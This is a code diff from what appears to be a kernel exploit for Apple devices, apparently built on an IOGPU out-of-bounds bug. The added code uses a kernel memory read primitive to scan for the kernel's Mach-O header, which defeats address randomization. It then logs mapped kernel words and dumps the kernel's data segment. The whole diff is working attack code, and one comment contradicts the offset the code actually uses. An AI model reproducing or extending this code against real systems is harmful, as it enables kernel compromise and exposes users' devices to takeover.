@@ -935,8 +935,44 @@ void nk_iogpu_group_oob_run(int trigger)
             if (magic == 0xfeedfacf) { found = base; ol("[grp] *** kernel Mach-O header found, base=0x%016llx", (unsigned long long)base); }
         }
         if (!found) {
-            ol("[grp] no kernel mapping found with the known slides");
-            return;
+            /* Do not guess the slide: SCAN for the Mach-O header over the
+             * whole kernel range. The probe is 16MB-aligned (the mapping
+             * base is), and grp_safe_read makes an unmapped probe a
+             * no-op instead of a crash. */
+            ol("[grp] sliding-slide guess failed; scanning the kernel range");
+            for (uint64_t base = 0xfffffff000000000ULL; base < 0xfffffff020000000ULL; base += 0x1000000ULL) {
+                uint32_t magic = 0;
+                if (grp_safe_read(base, &magic, 4) != 0) continue;
+                if (magic == 0xfeedfacf) {
+                    found = base;
+                    ol("[grp] *** kernel Mach-O header at 0x%016llx (slide=0x%llx)",
+                       (unsigned long long)base, (unsigned long long)(base - 0xfffffff007000000ULL));
+                    break;
+                }
+                /* the header may not be mapped; the __TEXT segment's magic
+                 * would sit at file offset 0 too, so also probe the
+                 * segment-aligned candidate a bit lower */
+                uint32_t m2 = 0;
+                if (grp_safe_read(base + 0x4000ULL, &m2, 4) == 0 && m2 == 0xfeedfacf) {
+                    found = base + 0x4000ULL;
+                    ol("[grp] *** kernel Mach-O header at 0x%016llx (+0x4000)",
+                       (unsigned long long)found);
+                    break;
+                }
+            }
+            if (!found) {
+                /* Show what IS mapped up there - one readable word per
+                 * 16MB step - so we can see the shape of the space. */
+                int shown = 0;
+                for (uint64_t base = 0xfffffff000000000ULL; base < 0xfffffff020000000ULL && shown < 24; base += 0x1000000ULL) {
+                    uint64_t v = 0;
+                    if (grp_safe_read(base, &v, 8) != 0) continue;
+                    ol("[grp]   mapped 0x%016llx = 0x%016llx", (unsigned long long)base, (unsigned long long)v);
+                    shown++;
+                }
+                ol("[grp] no kernel Mach-O header in the kernel range");
+                return;
+            }
         }
         /* dump the kernel's __DATA */
         uint64_t data = found + 0x3a20000ULL;
